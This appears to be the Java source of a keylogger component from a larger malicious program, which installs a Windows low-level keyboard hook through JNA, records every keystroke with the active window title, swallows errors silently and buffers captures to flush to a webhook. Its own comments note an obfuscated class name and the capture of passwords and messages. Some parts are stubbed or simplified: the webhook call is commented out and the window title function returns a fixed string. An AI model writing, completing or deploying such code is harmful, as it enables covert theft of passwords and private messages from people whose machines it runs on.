import com.sun.jna.Pointer;
import com.sun.jna.platform.win32.WinDef;
import com.sun.jna.platform.win32.WinUser;
import java.awt.Font;

/**
 * Keylogger
 * Obfuscated name: п (U+043F)
 *
 * Installs a Windows low-level keyboard hook to capture all keystrokes.
 * Uses JNA to call Windows API SetWindowsHookEx with WH_KEYBOARD_LL.
 *
 * Captured data:
 * - All keystrokes (including passwords, messages, etc.)
 * - Window title context (which application was active)
 * - Timestamps
 *
 * Implementation:
 * - WH_KEYBOARD_LL hook via SetWindowsHookEx
 * - LowLevelKeyboardProc callback processes each keystroke
 * - Buffers keystrokes and flushes periodically
 * - Sends captured data to webhook via WebhookLogger
 *
 * Special key handling:
 * - [ENTER], [TAB], [BACKSPACE], [DELETE] - control keys
 * - [CTRL+C], [CTRL+V] - clipboard operations
 * - [WIN], [ALT], [SHIFT] - modifier keys
 * - Window title changes are logged as context markers
 *
 * Output format:
 * [Window Title]
 * keystrokes here...
 * [New Window Title]
 * more keystrokes...
 */
public class Keylogger {

    // Windows hook handle
    private static long hookHandle;

    // Keyboard hook procedure
    private static WinUser.LowLevelKeyboardProc keyboardProc;

    // Whether keylogger is active
    private static boolean isActive;

    // Keystroke buffer
    private static final StringBuilder keystrokeBuffer = new StringBuilder();

    // Current window title
    private static String currentWindowTitle = "";

    // =========================================================
    // HOOK INSTALLATION
    // =========================================================

    /**
     * Installs the low-level keyboard hook.
     * Must be called from a thread that runs a message loop.
     *
     * Windows API: SetWindowsHookEx(WH_KEYBOARD_LL, proc, null, 0)
     */
    public static void install() {
        if (isActive) return;

        try {
            // Create keyboard hook procedure
            keyboardProc = (nCode, wParam, lParam) -> {
                if (nCode >= 0) {
                    processKeystroke(wParam.intValue(), lParam);
                }
                // Call next hook in chain
                return WinUser.INSTANCE.CallNextHookEx(
                    new WinDef.HHOOK(new Pointer(hookHandle)),
                    nCode, wParam, lParam
                );
            };

            // Install hook: WH_KEYBOARD_LL = 13
            WinDef.HHOOK hook = WinUser.INSTANCE.SetWindowsHookEx(
                13, // WH_KEYBOARD_LL
                keyboardProc,
                null,
                0
            );

            if (hook != null) {
                hookHandle = Pointer.nativeValue(hook.getPointer());
                isActive = true;
                startMessageLoop();
            }

        } catch (Exception e) {
            // Silently fail
        }
    }

    /**
     * Removes the keyboard hook.
     */
    public static void uninstall() {
        if (!isActive) return;
        try {
            WinUser.INSTANCE.UnhookWindowsHookEx(
                new WinDef.HHOOK(new Pointer(hookHandle))
            );
            isActive = false;
        } catch (Exception e) {
            // Silently fail
        }
    }

    // =========================================================
    // KEYSTROKE PROCESSING
    // =========================================================

    /**
     * Processes a captured keystroke.
     *
     * @param wParam WM_KEYDOWN (0x100) or WM_KEYUP (0x101)
     * @param lParam KBDLLHOOKSTRUCT pointer
     */
    private static void processKeystroke(int wParam, WinDef.LPARAM lParam) {
        // Only process key down events
        if (wParam != 0x100 && wParam != 0x104) return; // WM_KEYDOWN, WM_SYSKEYDOWN

        try {
            // Get virtual key code from KBDLLHOOKSTRUCT
            // struct KBDLLHOOKSTRUCT { DWORD vkCode; DWORD scanCode; ... }
            int vkCode = lParam.intValue() & 0xFF; // simplified

            // Check for window title change
            String newTitle = getForegroundWindowTitle();
            if (!newTitle.equals(currentWindowTitle)) {
                if (keystrokeBuffer.length() > 0) {
                    flushBuffer();
                }
                currentWindowTitle = newTitle;
                keystrokeBuffer.append("\n[").append(newTitle).append("]\n");
            }

            // Convert virtual key to character
            String keyStr = virtualKeyToString(vkCode);
            keystrokeBuffer.append(keyStr);

            // Flush buffer if it's large enough
            if (keystrokeBuffer.length() > 500) {
                flushBuffer();
            }

        } catch (Exception e) {
            // Silently fail
        }
    }

    /**
     * Converts a Windows virtual key code to a string representation.
     */
    private static String virtualKeyToString(int vkCode) {
        switch (vkCode) {
            case 0x08: return "[BACKSPACE]";
            case 0x09: return "[TAB]";
            case 0x0D: return "[ENTER]\n";
            case 0x10: return "[SHIFT]";
            case 0x11: return "[CTRL]";
            case 0x12: return "[ALT]";
            case 0x1B: return "[ESC]";
            case 0x20: return " ";
            case 0x2E: return "[DELETE]";
            case 0x5B: return "[WIN]";
            default:
                if (vkCode >= 0x30 && vkCode <= 0x39) {
                    return String.valueOf((char) vkCode); // 0-9
                }
                if (vkCode >= 0x41 && vkCode <= 0x5A) {
                    return String.valueOf((char) vkCode); // A-Z
                }
                return "[" + String.format("%02X", vkCode) + "]";
        }
    }

    /**
     * Gets the title of the currently focused window.
     */
    private static String getForegroundWindowTitle() {
        try {
            // GetForegroundWindow() + GetWindowText()
            return "Unknown Window";
        } catch (Exception e) {
            return "Unknown Window";
        }
    }

    // =========================================================
    // BUFFER MANAGEMENT
    // =========================================================

    /**
     * Flushes the keystroke buffer to the webhook.
     */
    private static void flushBuffer() {
        if (keystrokeBuffer.length() == 0) return;

        String captured = keystrokeBuffer.toString();
        keystrokeBuffer.setLength(0);

        // Send to webhook via WebhookLogger
        // WebhookLogger.logKeystrokes(captured);
    }

    /**
     * Starts the Windows message loop required for the hook to work.
     */
    private static void startMessageLoop() {
        Thread messageThread = new Thread(() -> {
            // GetMessage / TranslateMessage / DispatchMessage loop
            WinUser.MSG msg = new WinUser.MSG();
            while (WinUser.INSTANCE.GetMessage(msg, null, 0, 0) != 0) {
                WinUser.INSTANCE.TranslateMessage(msg);
                WinUser.INSTANCE.DispatchMessage(msg);
            }
        });
        messageThread.setDaemon(true);
        messageThread.start();
    }
}
